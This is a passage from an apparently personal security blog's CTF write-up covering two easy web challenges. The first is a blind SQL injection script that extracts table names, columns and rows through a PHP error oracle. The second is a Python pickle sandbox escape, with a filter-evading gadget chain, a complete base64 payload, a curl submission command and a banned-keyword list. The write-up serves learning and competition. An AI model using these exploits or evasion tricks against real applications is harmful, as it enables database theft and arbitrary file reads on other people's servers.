class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> oracle(<span class="string">f&quot;LENGTH((<span class="subst">&#123;query&#125;</span>))&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span>):</span><br><span class="line">            lo = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hi = mid</span><br><span class="line">    <span class="keyword">return</span> lo</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_char</span>(<span class="params">query, pos</span>):</span><br><span class="line">    lo, hi = <span class="number">0</span>, <span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> oracle(<span class="string">f&quot;ORD(SUBSTRING((<span class="subst">&#123;query&#125;</span>),<span class="subst">&#123;pos&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span>):</span><br><span class="line">            lo = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hi = mid</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(lo) <span class="keyword">if</span> <span class="number">32</span> &lt;= lo &lt; <span class="number">127</span> <span class="keyword">else</span> <span class="string">f&quot;\\x<span class="subst">&#123;lo:02x&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">query</span>):</span><br><span class="line">    n = get_len(query)</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        out += get_char(query, i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;n&#125;</span>] <span class="subst">&#123;out&#125;</span>&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Fetching all table names in `chall`...&quot;</span>)</span><br><span class="line">tables_str = extract(</span><br><span class="line">    <span class="string">&quot;SELECT GROUP_CONCAT(table_name SEPARATOR &#x27;,&#x27;) &quot;</span></span><br><span class="line">    <span class="string">&quot;FROM information_schema.tables WHERE table_schema=&#x27;chall&#x27;&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Tables: <span class="subst">&#123;tables_str&#125;</span>&quot;</span>)</span><br><span class="line">tables = tables_str.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tables:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n=== Table: <span class="subst">&#123;t&#125;</span> ===&quot;</span>)</span><br><span class="line">    cols_str = extract(</span><br><span class="line">        <span class="string">f&quot;SELECT GROUP_CONCAT(column_name SEPARATOR &#x27;,&#x27;) &quot;</span></span><br><span class="line">        <span class="string">f&quot;FROM information_schema.columns &quot;</span></span><br><span class="line">        <span class="string">f&quot;WHERE table_schema=&#x27;chall&#x27; AND table_name=&#x27;<span class="subst">&#123;t&#125;</span>&#x27;&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Columns: <span class="subst">&#123;cols_str&#125;</span>&quot;</span>)</span><br><span class="line">    cols = cols_str.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"></span><br><span class="line">    row_expr = <span class="string">&quot;CONCAT_WS(&#x27;|&#x27;,&quot;</span> + <span class="string">&quot;,&quot;</span>.join(cols) + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        val = extract(<span class="string">f&quot;SELECT <span class="subst">&#123;row_expr&#125;</span> FROM <span class="subst">&#123;t&#125;</span> LIMIT <span class="subst">&#123;i&#125;</span>,1&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> val:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  Row <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;val&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[*] Done.&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="How-it-works"><a href="#How-it-works" class="headerlink" title="How it works"></a>How it works</h3><ol>
+<li><code>oracle(cond)</code> sends the conditional <code>INTO @x</code> payload and checks the response for <code>Fatal error</code>.</li>
+<li><code>get_len(query)</code> binary searches on <code>LENGTH()</code>.</li>
+<li><code>get_char(query, pos)</code> binary searches on <code>ORD(SUBSTRING(..., pos, 1))</code>.</li>
+<li><code>extract(query)</code> walks the string one character at a time.</li>
+<li>Enumeration lists all tables in <code>chall</code>, then all columns of each, then dumps up to 10 rows per table via <code>GROUP_CONCAT</code>.</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install requests</span><br><span class="line">python3 extract.py</span><br></pre></td></tr></table></figure>
+
+<p>The flag lands in one of the dumped rows, usually in a <code>flag</code> table’s <code>value</code> column or in <code>users.password</code>.</p>
+<h2 id="7-Summary-of-the-exploit-chain"><a href="#7-Summary-of-the-exploit-chain" class="headerlink" title="7. Summary of the exploit chain"></a>7. Summary of the exploit chain</h2><ol>
+<li><strong>Spot the type confusion.</strong> <code>$res-&gt;fetch_row()</code> on a boolean crashes PHP.</li>
+<li><strong>Trigger <code>TRUE</code> deterministically</strong> with <code>SELECT ... INTO @x</code>.</li>
+<li><strong>Make it conditional</strong> with <code>IF(cond, 1, EXP(99999))</code>, a runtime error rather than a parse error.</li>
+<li><strong>Build a boolean oracle</strong> on the presence of <code>Fatal error</code> in the response.</li>
+<li><strong>Extract with binary search and <code>GROUP_CONCAT</code></strong> to defeat the 2-second floor.</li>
+</ol>
+<p>The 2-second shutdown sleep and its <code>// no timing attack!!</code> comment were the intended red herring. The real vulnerability is the type confusion between <code>mysqli_result</code> and <code>TRUE</code> at line 14, which hands you a boolean side channel that the timing lock does nothing to stop.</p>
+<h2 id="8-Key-takeaways"><a href="#8-Key-takeaways" class="headerlink" title="8. Key takeaways"></a>8. Key takeaways</h2><ul>
+<li><strong><code>mysqli::query()</code> has three return types</strong>, and checking only <code>if (!$res)</code> is not enough. Any code that assumes <code>mysqli_result</code> after that check is broken.</li>
+<li><strong>Runtime errors beat parse errors</strong> for conditional blind SQLi. <code>EXP(99999)</code>, <code>1/0</code>, <code>CAST(... AS UNSIGNED)</code> and <code>UPDATEXML()</code> all error at evaluation time and are safe on the branch that isn’t taken.</li>
+<li><strong><code>INTO @var</code></strong> is a privilege-free way to force a non-result-set return.</li>
+<li><strong><code>GROUP_CONCAT</code> plus binary search</strong> is the standard way to make boolean blind SQLi bearable over slow links.</li>
+<li>When every classic channel is dead, look for the bug in the PHP itself, not the SQL.</li>
+</ul>
+<hr>
+<h1 id="Challenge-2-Time-Capsule-Pickle-Sandbox-Escape"><a href="#Challenge-2-Time-Capsule-Pickle-Sandbox-Escape" class="headerlink" title="Challenge 2: Time Capsule (Pickle Sandbox Escape)"></a>Challenge 2: Time Capsule (Pickle Sandbox Escape)</h1><blockquote>
+<p><strong>Difficulty</strong>: <span style="color:#9fef00">Easy</span> &nbsp;|&nbsp; <strong>Category</strong>: <span style="color:#9fef00">Web</span></p>
+</blockquote>
+<h2 id="Challenge-summary"><a href="#Challenge-summary" class="headerlink" title="Challenge summary"></a>Challenge summary</h2><p>A Flask web app called “Time Capsule” accepts a base64-encoded Python pickle, runs it through a hardened restricted unpickler, and executes whatever it decodes to. Three independent layers of defense stand between the payload and code execution. The goal is to read <code>/app/flag.txt</code> on the server.</p>
+<h2 id="Challenge-statement"><a href="#Challenge-statement" class="headerlink" title="Challenge statement"></a>Challenge statement</h2><p>The challenge ships six files: a <code>Dockerfile</code>, <code>docker-compose.yml</code>, <code>webapp.py</code>, <code>sessionstore.py</code>, <code>app.js</code> and <code>index.html</code>. The app exposes a single endpoint:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /restore</span><br><span class="line">Body: &#123;&quot;payload&quot;: &quot;&lt;base64&gt;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The server base64-decodes the payload, runs it through a filter, then deserializes it:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">BANNED_PATTERNS = [</span><br><span class="line">    <span class="string">b&quot;.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;os&quot;</span>, <span class="string">b&quot;system&quot;</span>, <span class="string">b&quot;popen&quot;</span>, <span class="string">b&quot;subprocess&quot;</span>, <span class="string">b&quot;commands&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;exec&quot;</span>, <span class="string">b&quot;eval&quot;</span>, <span class="string">b&quot;import&quot;</span>, <span class="string">b&quot;getattr&quot;</span>, <span class="string">b&quot;setattr&quot;</span>, <span class="string">b&quot;flag&quot;</span></span><br><span class="line">]</span><br><span class="line">BANNED_INSTRUCTION = <span class="string">&quot;REDUCE&quot;</span></span><br><span class="line">ALLOWED_MODULES = &#123;<span class="string">&quot;sessionstore&quot;</span>, <span class="string">&quot;collections&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_MODULES:</span><br><span class="line">            <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;module %r is not allowed&quot;</span> % module)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().find_class(module, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> BANNED_PATTERNS:</span><br><span class="line">        <span class="keyword">if</span> pattern <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Payload contains banned characters!&quot;</span>)</span><br><span class="line">    out = io.StringIO()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pickletools.dis(data, out=out)</span><br><span class="line">        disassembled = out.getvalue()</span><br><span class="line">        <span class="keyword">if</span> BANNED_INSTRUCTION <span class="keyword">in</span> disassembled:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Payload contains banned instruction: %s&quot;</span> % BANNED_INSTRUCTION)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        disassembled = <span class="string">&quot;Error!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> disassembled</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restore</span>(<span class="params">raw_b64</span>):</span><br><span class="line">    data = base64.b64decode(raw_b64)</span><br><span class="line">    disassembled = check(data)</span><br><span class="line">    buf = io.StringIO()</span><br><span class="line">    <span class="keyword">with</span> contextlib.redirect_stdout(buf):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            RestrictedUnpickler(io.BytesIO(data)).load()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> buf.getvalue(), disassembled</span><br></pre></td></tr></table></figure>
+
+<p>Docker confirms Python 3.12 and the flag location:</p>
+<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.12</span>-slim</span><br><span class="line">...</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chown</span>=root:root flag.txt /app/flag.txt</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="The-three-defenses"><a href="#The-three-defenses" class="headerlink" title="The three defenses"></a>The three defenses</h2><p><strong>Module allow-list.</strong> Only imports from <code>sessionstore</code> (the app’s own tiny helper module, with <code>Capsule</code>, <code>render</code> and <code>new_capsule</code>) or <code>collections</code> are permitted. No <code>os</code>, no <code>sys</code>, no <code>subprocess</code>.</p>
+<p><strong><code>REDUCE</code> opcode ban.</strong> After disassembling the payload with <code>pickletools.dis</code>, if the string <code>&quot;REDUCE&quot;</code> appears anywhere in the output, the payload is rejected. <code>REDUCE</code> is the opcode the textbook pickle exploit relies on: <code>GLOBAL</code> a dangerous callable, push args, <code>REDUCE</code> to call it.</p>
+<p><strong>Raw-byte substring filter.</strong> The <em>undecoded</em> pickle bytes are scanned for <code>os</code>, <code>system</code>, <code>subprocess</code>, <code>import</code>, <code>getattr</code>, <code>setattr</code>, <code>flag</code> and friends. Notably, <code>.</code> (a bare period) is banned outright.</p>
+<h2 id="How-we-got-there"><a href="#How-we-got-there" class="headerlink" title="How we got there"></a>How we got there</h2><p><strong>Pickle isn’t just data, it’s a tiny stack VM.</strong> Deserializing a pickle means executing a stream of opcodes: <code>GLOBAL</code> resolves <code>module.name</code>, various opcodes build containers, and normally <code>REDUCE</code> calls a function with arguments. That’s what makes pickle deserialization dangerous, and it’s what this challenge partially blocks.</p>
+<p><strong><code>REDUCE</code> isn’t the only opcode that calls something.</strong> Pickle protocol 0 has an older opcode, <code>OBJ</code>, whose handler in <code>pickle.py</code> does roughly this:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">args = pop_mark()      <span class="comment"># everything since the last MARK</span></span><br><span class="line">cls = args.pop(<span class="number">0</span>)      <span class="comment"># first item = the &quot;callable&quot;</span></span><br><span class="line"><span class="keyword">return</span> cls(*args)      <span class="comment"># ordinary Python call</span></span><br></pre></td></tr></table></figure>
+
+<p>I confirmed it empirically: a hand-crafted payload using <code>OBJ</code> instead of <code>REDUCE</code> disassembles with no <code>&quot;REDUCE&quot;</code> in the output, and still calls the target with arguments.</p>
+<p><strong>Finding a gadget inside the whitelist.</strong> <code>collections</code> looks harmless, since it’s just container types, but reading its actual source with <code>inspect.getsource</code> shows two things worth exploiting:</p>
+<ul>
+<li><code>collections.__builtins__</code>: for any normally-imported module, Python auto-injects <code>__builtins__</code> into its namespace as <strong>the real builtins dict</strong>, not the module object. <code>GLOBAL collections __builtins__</code> hands you every builtin function by name (<code>open</code>, <code>print</code>, <code>vars</code>, <code>type</code>, <code>chr</code>, <code>str</code>, <code>len</code>, and the rest) for free.</li>
+<li><code>collections._itemgetter</code>: <code>collections</code> imports <code>operator.itemgetter</code> as a private name at the top of the file. <code>itemgetter(key)(obj)</code> is <code>obj[key]</code> expressed as a function call instead of <code>[]</code> syntax.</li>
+</ul>
+<p><strong>Generic attribute access without <code>.</code> or <code>getattr</code>.</strong> The byte filter blocks the literal <code>.</code> and the word <code>getattr</code>, so no dot syntax and no <code>getattr()</code> calls anywhere. The workaround: <code>vars(obj)</code> returns <code>obj.__dict__</code> for <em>any</em> object that has one (modules, classes, instances), and that dict is subscriptable via <code>itemgetter</code>. Combined with <code>type()</code>, this gives a full reflection primitive:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vars</span>(<span class="built_in">type</span>(some_object))[<span class="string">&#x27;method_name&#x27;</span>](some_object, *args)</span><br><span class="line"><span class="comment"># equivalent to: some_object.method_name(*args)</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>No <code>STOP</code> opcode.</strong> <code>STOP</code>, the opcode marking end of stream, is literally the byte <code>0x2e</code>, which is <code>.</code>, which is banned. Every payload therefore has to end abruptly without it. <code>restore()</code> catches the resulting <code>EOFError</code> with a bare <code>except: pass</code>, so this costs nothing. It also has a side effect in our favor: <code>check()</code>‘s <code>pickletools.dis()</code> call raises on the truncated stream, caught by the <em>same</em> broad <code>except Exception</code>, so the <code>&quot;REDUCE&quot;</code> string search never even executes for any STOP-less payload.</p>
+<p><strong>Building <code>/app/flag.txt</code> without the literal bytes <code>flag</code> or <code>.</code>.</strong> The filename gets assembled piece by piece at <em>runtime</em>: <code>&quot;/app/fl&quot; + &quot;ag&quot; + chr(N) + &quot;txt&quot;</code>, where <code>N</code> needs to equal 46, the ASCII code for <code>.</code>. My first attempt embedded the integer <code>46</code> directly via a <code>BININT1</code> opcode, which puts the raw byte <code>0x2e</code> straight into the payload and immediately trips the <code>.</code> filter, an actual bug I caught while testing. The fix is to compute <code>46</code> at runtime instead of writing it: concatenate two filler strings of safe lengths (20 and 26 characters) and take <code>len()</code> of the result, so the number 46 only ever exists in memory during unpickling, never as a byte I sent.</p>
+<h2 id="Final-exploit-chain"><a href="#Final-exploit-chain" class="headerlink" title="Final exploit chain"></a>Final exploit chain</h2><ol>
+<li><code>GLOBAL collections _itemgetter</code> → <code>operator.itemgetter</code></li>
+<li><code>GLOBAL collections __builtins__</code> → the real builtins dict</li>
+<li>Pull <code>vars</code>, <code>type</code>, <code>open</code>, <code>print</code>, <code>chr</code>, <code>str</code> and <code>len</code> out of that dict via <code>itemgetter</code></li>
+<li>Build the integer <code>46</code> from <code>len(&quot;q&quot;*20 + &quot;q&quot;*26)</code>, then <code>chr(46)</code> → <code>&quot;.&quot;</code></li>
+<li>Assemble <code>[&quot;/app/fl&quot;, &quot;ag&quot;, &quot;.&quot;, &quot;txt&quot;]</code> as a pickle list, join with <code>&quot;&quot;</code></li>
+<li><code>open(path)</code> → file handle</li>
+<li><code>vars(type(fh))[&#39;read&#39;](fh)</code> → file contents, with no dot and no <code>getattr</code></li>
+<li><code>print(contents)</code> → lands in the app’s captured stdout, returned in the JSON response</li>
+<li>Every call uses <code>OBJ</code>, never <code>REDUCE</code>, and the stream has no <code>STOP</code></li>
+</ol>
+<h2 id="Proof-of-concept"><a href="#Proof-of-concept" class="headerlink" title="Proof of concept"></a>Proof of concept</h2><p>Rather than hand-write raw pickle bytes, I built a small opcode assembler (<code>MARK</code>, <code>SHORT_BINUNICODE</code>, <code>GLOBAL</code>, <code>OBJ</code>, <code>BINPUT</code>&#x2F;<code>BINGET</code> for memoization, <code>EMPTY_LIST</code>&#x2F;<code>APPENDS</code>) and tested the full chain against an exact local copy of <code>check()</code>, <code>RestrictedUnpickler</code> and <code>restore()</code> taken from the provided <code>webapp.py</code>, on Python 3.12.3 to match <code>python:3.12-slim</code>.</p>
+<p>First I proved the mechanics against a local test file with a dot-free name, where the full reflection chain worked and printed the file contents correctly. Then I proved the obfuscated path reconstruction against a local file deliberately named with “flag” and “.” in it, confirming the payload passed the banned-substring filter and still printed the right contents. Only then did I swap the path fragments to target <code>/app/flag.txt</code> for the real submission.</p>
+<h2 id="Final-payload"><a href="#Final-payload" class="headerlink" title="Final payload"></a>Final payload</h2><p>Submit as the <code>payload</code> field to <code>/restore</code>:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y2NvbGxlY3Rpb25zCl9pdGVtZ2V0dGVyCnEAY2NvbGxlY3Rpb25zCl9fYnVpbHRpbnNfXwpxAShoAIwEdmFyc29xAihoAmgBb3EDKGgAjAR0eXBlb3EEKGgEaAFvcQUoaACMBG9wZW5vcQYoaAZoAW9xByhoAIwFcHJpbnRvcQgoaAhoAW9xCShoAIwDY2hyb3EKKGgKaAFvcQsoaACMA3N0cm9xDChoDGgBb3ENKGgDaA1vcQ4oaACMBGpvaW5vcQ8oaA9oDm9xEChoAIwDbGVub3ERKGgRaAFvcRJdcRNoEyiMFHFxcXFxcXFxcXFxcXFxcXFxcXFxjBpxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcWVxFChoEIwAaBRvcRUoaBJoFW9xFihoC2gWb3EXXXEYaBgojAcvYXBwL2ZsjAJhZ2gXjAN0eHRlMChoEIwAaBhvcRkoaAdoGW9xGihoBWgab3EbKGgDaBtvcRwoaACMBHJlYWRvcR0oaB1oHG9xHihoHmgab3EfKGgJaB9v</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST https://&lt;target-host&gt;/restore \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;payload&quot;:&quot;&lt;the base64 above&gt;&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>The <code>output</code> field of the JSON response contains the flag.</p>
+<h2 id="Key-techniques"><a href="#Key-techniques" class="headerlink" title="Key techniques"></a>Key techniques</h2><ul>
+<li><code>REDUCE</code> isn’t the only pickle opcode that calls a callable. <code>OBJ</code>, protocol 0’s <code>cls(*args)</code> form, works identically and shows up as a distinct opcode name in <code>pickletools.dis</code> output.</li>
+<li>A whitelisted, safe-looking module can still leak dangerous references. Always check what a module quietly imports at its own top level with <code>inspect.getsource</code>, not just its documented public API.</li>
+<li><code>vars(obj)</code> (which gives <code>obj.__dict__</code>) plus a subscript primitive like <code>operator.itemgetter</code> together form a full generic attribute-read gadget that needs neither dot syntax nor <code>getattr</code>.</li>
+<li>Pickle’s <code>STOP</code> opcode is the literal byte <code>.</code>, so a filter banning <code>.</code> forces every payload to end abruptly. Check whether the app’s exception handling around <code>Unpickler.load()</code> tolerates that before assuming it’s fatal.</li>
+<li>Never embed a sensitive integer or string literally if a filter can see it. Compute it at runtime, for example via <code>len()</code> of unrelated strings, so it only exists in memory during execution and never in the bytes you send.</li>
+</ul>
+<hr>
+<h2 id="Closing-Thoughts"><a href="#Closing-Thoughts" class="headerlink" title="Closing Thoughts"></a>Closing Thoughts</h2><p>Two flags, both easy web. That’s the whole result for this one, and there’s no reason to dress it up as more than it was.</p>
+<p>What made both worth the time was that neither gave up its flag to the obvious first move. sqlmap ran for over 30 minutes against Slop Slop Go Away and found nothing, because the bug wasn’t in the SQL at all, it was three lines of PHP below the query. Time Capsule blocked the pickle opcode everyone reaches for first and left an older one sitting right next to it, unblocked. In both cases the fix came from rereading the source slowly instead of trusting the first tool that came to hand, and Time Capsule even caught me making the same kind of mistake once, when an early payload leaked the banned byte <code>0x2e</code> straight into the pickle stream through a <code>BININT1</code> opcode.</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/0xkoat">Youssef Kessentini</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://kessentini-youssef.dev/2026/09/16/PwnSec-CTF-2026/">https://kessentini-youssef.dev/2026/09/16/PwnSec-CTF-2026/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL-Injection/">SQL Injection</a><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Blind-SQLi/">Blind SQLi</a><a class="post-meta__tags" href="/tags/Python/">Python</a><a class="post-meta__tags" href="/tags/Pickle/">Pickle</a><a class="post-meta__tags" href="/tags/Deserialization/">Deserialization</a><a class="post-meta__tags" href="/tags/PHP/">PHP</a></div><div class="post-share"><div class="social-share" data-image="/img/pwnsec-cover.png" data-sites="x,reddit,telegram,email"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/08/29/Command-Injection/" title="OS Command Injection"><img class="cover" src="/img/command-injection-cover.png" onerror="onerror=null;src='/img/banner.png'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">OS Command Injection</div></div><div class="info-2"><div class="info-item-1">What I learned after completing the OS Command Injection path in Portswigger</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/06/20/Dark-Runes/" title="Dark Runes"><img class="cover" src="/img/dark-runes-cover.png" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-20</div><div class="info-item-2">Dark Runes</div></div><div class="info-2"><div class="info-item-1">HTB Web challenge — Admin registration, 4-digit brute force, and Local File Inclusion via PhantomJS PDF rendering</div></div></div></a><a class="pagination-related" href="/2026/07/11/CCTV/" title="CCTV"><img class="cover" src="/img/cctv-cover.png" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-11</div><div class="info-item-2">CCTV</div></div><div class="info-2"><div class="info-item-1">HTB Easy Linux machine — default creds into ZoneMinder, time-based SQL injection (CVE-2024-51482) to dump password hashes, and root via motionEye command injection (CVE-2025-60787)</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/avatar.png'" alt="avatar"/ loading='lazy'></div><div class="author-info-name">Youssef Kessentini</div><div class="author-info-description">Security researcher & CTF player. Escalating privileges one machine at a time.</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">40</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/0xkoat" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #ffffff;"></i></a><a class="social-icon" href="https://app.hackthebox.com/public/users/3132736" target="_blank" title="HackTheBox"><i class="fas fa-cube" style="color: #9fef00;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/kessentini-youssef-pro/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0077b5;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">🚩 New writeups every week! HTB machines, CTF challenges, and more.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Challenge-1-Slop-Slop-Go-Away"><span class="toc-number">2.</span> <span class="toc-text">Challenge 1: Slop Slop Go Away</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-The-source-code"><span class="toc-number">2.1.</span> <span class="toc-text">1. The source code</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Observations"><span class="toc-number">2.1.1.</span> <span class="toc-text">Observations</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-subtle-bug"><span class="toc-number">2.1.2.</span> <span class="toc-text">The subtle bug</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-The-dead-ends"><span 